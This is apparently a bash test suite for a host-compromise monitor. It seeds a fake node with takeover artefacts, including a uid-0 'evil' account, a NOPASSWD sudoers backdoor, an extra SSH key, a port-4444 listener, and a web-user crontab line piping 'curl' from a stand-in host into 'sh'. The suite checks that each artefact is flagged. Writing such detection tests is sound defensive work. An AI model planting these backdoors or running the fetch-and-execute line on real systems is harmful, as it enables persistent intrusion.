#!/bin/bash
# The account watch against a fake node: each way a takeover gets a foothold is flagged, a clean night stays quiet.
#   bash tests/account-watch/run.sh
set -uo pipefail
HERE="$(cd "$(dirname "$0")/../.." && pwd)"; W="$HERE/scripts/account-watch.py"
D="$(mktemp -d)"; trap 'rm -rf "${D:?}"' EXIT
pass=0; fail=0
has()  { grep -F -- "$2" <<<"$3" >/dev/null && { pass=$((pass+1)); echo "  ok   $1"; } || { fail=$((fail+1)); echo "  FAIL $1 (no '$2')"; sed 's/^/       /' <<<"$3"; }; }
none() { grep -F "FLAG" <<<"$2" >/dev/null && { fail=$((fail+1)); echo "  FAIL $1"; sed 's/^/       /' <<<"$2"; } || { pass=$((pass+1)); echo "  ok   $1"; }; }
lacks() { grep -F -- "$2" <<<"$3" >/dev/null && { fail=$((fail+1)); echo "  FAIL $1 (found '$2')"; } || { pass=$((pass+1)); echo "  ok   $1"; }; }
eq()   { [[ "$2" == "$3" ]] && { pass=$((pass+1)); echo "  ok   $1"; } || { fail=$((fail+1)); echo "  FAIL $1 (want '$2', got '$3')"; }; }

R="$D/root"; mkdir -p "$R/etc/sudoers.d" "$R/etc/cron.d" "$R/var/spool/cron/crontabs" "$R/etc/systemd/system" "$R/home/op/.ssh" "$D/bin"
cat > "$R/etc/passwd" <<'E'
root:x:0:0:root:/root:/bin/bash
op:x:1000:1000::/home/op:/bin/bash
www-data:x:33:33::/var/www:/usr/sbin/nologin
E
printf 'sudo:x:27:op\ndocker:x:999:\nadm:x:4:syslog,op\nusers:x:100:\n' > "$R/etc/group"
printf 'root ALL=(ALL:ALL) ALL\n%%sudo ALL=(ALL:ALL) ALL\n' > "$R/etc/sudoers"
printf 'op ALL=(root) NOPASSWD: /usr/bin/systemctl restart gnode-daemon\n' > "$R/etc/sudoers.d/deploy"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaseKeyBaseKeyBaseKeyBaseKeyBaseKeyBaseKey00 op@laptop" > "$R/home/op/.ssh/authorized_keys"
echo "*/5 * * * * root /opt/sweep" > "$R/etc/cron.d/sweep"
touch "$R/etc/systemd/system/gnode-daemon.service"
NOW=$(date +%Y-%m-%dT%H:%M:%S+01:00)
cat > "$D/bin/last" <<E
#!/bin/bash
cat "$D/last.out"
E
cat > "$D/bin/auth" <<E
#!/bin/bash
cat "$D/auth.out"
E
cat > "$D/bin/docker" <<E
#!/bin/bash
cat "$D/docker.out"
E
cat > "$D/bin/wg" <<E
#!/bin/bash
cat "$D/wg.out"
E
cat > "$D/bin/ports" <<E
#!/bin/bash
cat "$D/ports.out"
E
chmod +x "$D/bin/"*
echo "op       pts/0        203.0.113.7      $NOW   still logged in" > "$D/last.out"
printf '%s host sudo[1]:   op : TTY=pts/0 ; PWD=/home/op ; USER=root ; COMMAND=/usr/bin/systemctl restart gnode-daemon\n%s host sudo[2]:     root : PWD=/ ; USER=op ; COMMAND=/usr/bin/git fetch origin main\n' "$NOW" "$NOW" > "$D/auth.out"
echo "valkey/valkey:latest@sha256:aaa" > "$D/docker.out"
printf 'tcp LISTEN 0 511 127.0.0.1:47445 0.0.0.0:*\nudp UNCONN 0 0 0.0.0.0:53601 0.0.0.0:*\n' > "$D/ports.out"
printf 'wg-geodineum\t53601\n' > "$D/wg.out"
go() { python3 -I "$W" --root "$R" --state "$D/st" --status "$D/nodir/s" --no-alert \
       --cmd-last "$D/bin/last" --cmd-auth "$D/bin/auth" --cmd-docker "$D/bin/docker" --cmd-ports "$D/bin/ports" --cmd-wg "$D/bin/wg" "$@" 2>&1; }

o=$(go); none "first run: baseline, no flags" "$o"; has "first run says baseline" "baseline recorded" "$o"
has "the digest names who logged in and from where" "logins op: 203.0.113.7 x1" "$o"
has "the digest counts the operator's sudo" "sudo op: 1" "$o"
has "the sweep's sudo is counted apart" "sudo root (the sweep and timers): 1" "$o"
lacks "nothing secret in the state" "AAAAC3Nza" "$(cat "$D/st/state.json")"
o=$(go); none "second run, same node: quiet" "$o"

echo "evil:x:0:0::/home/evil:/bin/bash" >> "$R/etc/passwd"; o=$(go)
has "a new account that can log in (uid 0)" "account that can log in: new evil: uid 0" "$o"
go --accept >/dev/null; o=$(go); none "accepted: quiet" "$o"

sed -i 's/^docker:x:999:$/docker:x:999:op/' "$R/etc/group"; o=$(go); has "someone added to docker" "group docker: added op" "$o"; go --accept >/dev/null
printf 'op ALL=(ALL) NOPASSWD: /usr/bin/tee\n' > "$R/etc/sudoers.d/zz-backdoor"; o=$(go); has "a new sudoers file" "sudoers: new zz-backdoor" "$o"; has "and its line" "sudoers: new zz-backdoor: op ALL=(ALL) NOPASSWD: /usr/bin/tee" "$o"; go --accept >/dev/null
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilKeyEvilKeyEvilKeyEvilKeyEvilKeyEvilKeyEv1 x@y" >> "$R/home/op/.ssh/authorized_keys"; o=$(go)
has "a key added to authorized_keys" "ssh key op: added" "$o"; go --accept >/dev/null
echo "* * * * * curl -s http://x.example/p | sh" > "$R/var/spool/cron/crontabs/www-data"; o=$(go); has "a crontab for the web user" "crontab: new /var/spool/cron/crontabs/www-data" "$o"; go --accept >/dev/null
echo 'API_TOKEN=abc123 0 * * * * root /x' > "$R/etc/cron.d/tok"; o=$(go); lacks "a token in a crontab is masked" "abc123" "$o"; go --accept >/dev/null
touch "$R/etc/systemd/system/kworker.service"; o=$(go); has "a new systemd unit" "systemd unit: added kworker.service" "$o"; go --accept >/dev/null
echo "mariadb:11@sha256:bbb" >> "$D/docker.out"; o=$(go); has "a pulled image" "docker image: added mariadb:11@sha256:bbb" "$o"; go --accept >/dev/null
printf 'tcp LISTEN 0 5 0.0.0.0:4444 0.0.0.0:*\n' >> "$D/ports.out"; o=$(go); has "a new listener" "listening port: added tcp 0.0.0.0:4444" "$o"; go --accept >/dev/null
echo "op       pts/1        198.51.100.9     $NOW   still logged in" >> "$D/last.out"; o=$(go)
has "a login from an address never seen for that account" "login: op from 198.51.100.9" "$o"
o=$(go); eq "the address is remembered after one night: no second finding for it" 1 "$(grep -c 'login: op from 198.51.100.9' <<<"$o")"
go --accept >/dev/null; o=$(go); none "answered: the node is quiet again" "$o"
printf 'exit 1\n' > "$D/bin/docker"; o=$(go); none "docker not answering is not 'every image removed'" "$o"
sed -i 's/53601/53136/' "$D/ports.out" "$D/wg.out"; o=$(go); none "WireGuard's port changing at a reboot is not a new listener" "$o"
mkdir -p "$R/proc/4242" "$R/proc/4243"; printf 'Name:\tclaude\nUid:\t1000\t1000\t1000\t1000\n' > "$R/proc/4242/status"; printf 'Name:\tsvc\nUid:\t0\t0\t0\t0\n' > "$R/proc/4243/status"
printf 'tcp LISTEN 0 512 127.0.0.1:36445 0.0.0.0:* users:(("claude",pid=4242,fd=26))\n' >> "$D/ports.out"; o=$(go); none "a local port a person's own program opened is not a question" "$o"
printf 'tcp LISTEN 0 512 127.0.0.1:36446 0.0.0.0:* users:(("svc",pid=4243,fd=3))\n' >> "$D/ports.out"; o=$(go); has "a local port a root program opened still is" "listening port: added tcp 127.0.0.1:36446" "$o"
printf 'tcp LISTEN 0 512 0.0.0.0:36447 0.0.0.0:* users:(("claude",pid=4242,fd=27))\n' >> "$D/ports.out"; o=$(go); has "and so is a person's port open to the network" "listening port: added tcp 0.0.0.0:36447" "$o"
go --accept >/dev/null; sed -i '/3644[67]/d' "$D/ports.out"; go --accept >/dev/null
old_baseline() { python3 -I -c 'import json,sys; f=sys.argv[1]; s=json.load(open(f)); s.pop("wg_excluded",None); s["ports"]=sorted(s["ports"]+sys.argv[2:]); json.dump(s,open(f,"w"))' "$D/st/state.json" "$@"; }
old_baseline "udp 0.0.0.0:41000"; o=$(go); none "a baseline from before the WireGuard rule: its gone UDP port is not 'removed'" "$o"
o=$(go); none "and stays quiet after that" "$o"
old_baseline "tcp 0.0.0.0:9999"; o=$(go); has "a TCP listener that went away is information" "INFO listening port: removed tcp 0.0.0.0:9999" "$o"
none "not a flag" "$o"
has "the digest is kept on the node" '"lines"' "$(cat "$D/st/digest.json")"
j() { python3 -I -c 'import json,sys; d=json.load(open(sys.argv[1])); print(eval(sys.argv[2], {"d": d}))' "$D/st/digest.json" "$1"; }
has "the digest counts logins per account and address" "203.0.113.7=1" "$(j '",".join(f"{ip}={n}" for ip, n in d["logins"]["op"].items())')"
has "and sudo per account" "1" "$(j 'd["sudo"]["op"]')"
mode() { python3 -I -B -c 'import importlib.util,sys,types
s=importlib.util.spec_from_file_location("w", sys.argv[1]); w=importlib.util.module_from_spec(s); s.loader.exec_module(w)
print(w.daily_mode(types.SimpleNamespace(daily=sys.argv[2], status=sys.argv[3])))' "$W" "$1" "$D/jobs/account-watch.status"; }
mkdir -p "$D/jobs"; has "auto: the digest goes with alerts while no daily report runs" "send" "$(mode auto)"
touch "$D/jobs/daily-report.status"; has "auto: the daily report carries it once its status file is there" "report" "$(mode auto)"
has "an explicit setting wins" "send" "$(mode send)"

echo "-- one finding at a time"
printf 'exec cat "%s/docker.out"\n' "$D" > "$D/bin/docker"; go --accept >/dev/null
rec() { python3 -I -c 'import json,sys; s=json.load(open(sys.argv[1])); r=[dict(v,id=k) for k,v in s.get("findings",{}).items() if sys.argv[2] in v["text"]]; print(r[0].get(sys.argv[3]) if r else "none")' "$D/st/state.json" "$1" "$2"; }
touch "$R/etc/systemd/system/miner.service"; printf 'tcp LISTEN 0 5 0.0.0.0:5555 0.0.0.0:*\n' >> "$D/ports.out"
o=$(go); has "two changes, two findings" "listening port: added tcp 0.0.0.0:5555" "$o"; has "the other" "systemd unit: added miner.service" "$o"
IU=$(rec miner.service id); IP=$(rec 5555 id)
o=$(go); eq "a finding keeps its id from run to run" "$IU" "$(rec miner.service id)"
eq "the id is its kind and subject, not its wording" "$IU" "$(python3 -I -c 'import hashlib; print(hashlib.sha256(b"units\nminer.service|").hexdigest()[:10])')"
o=$(go --accept "$IU" --nonce "$(rec 5555 nonce)"); rc=$?
eq "--accept <id> with another finding's nonce is refused" "3 new" "$rc $(rec miner.service status)"
o=$(go --accept "$IU"); has "--accept <id> takes that one" "accepted $IU: unit miner.service" "$o"
eq "and only that one" "accepted new" "$(rec miner.service status) $(rec 5555 status)"
o=$(go); lacks "the accepted one is quiet" "miner.service" "$o"; has "the other stays" "0.0.0.0:5555" "$o"
has "the accepted unit is in the baseline" "miner.service" "$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["units"])' "$D/st/state.json")"
lacks "the waiting listener is not" "5555" "$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["ports"])' "$D/st/state.json")"
o=$(go --accept 0123456789); rc=$?; eq "an unknown id: nothing" 3 "$rc"
o=$(go --reject "$IP" --no-alert); has "--reject <id> marks it not ours" "rejected $IP" "$o"
o=$(go); has "a rejected finding stays open" "0.0.0.0:5555  [rejected $IP]" "$o"
has "and the daily report sees it" '"status": "rejected"' "$(cat "$D/st/digest.json")"
sed -i '/5555/d' "$D/ports.out"; o=$(go); none "gone from the node: gone" "$o"; eq "its record says so" gone "$(rec 5555 status)"
lacks "a finding that went before it was accepted was never in the baseline: nothing removed" "5555" "$o"
rm -f "$R/etc/systemd/system/miner.service"; o=$(go); none "an accepted unit that went away is not a flag" "$o"
has "it is in the digest as information" "systemd unit: removed miner.service" "$(python3 -I -c 'import json,sys; print(json.load(open(sys.argv[1]))["info"])' "$D/st/digest.json")"
lacks "the state holds no nonce outside the findings" "nonce" "$(cat "$D/st/digest.json")"
echo "== $pass ok, $fail failed"; exit $(( fail > 0 ))
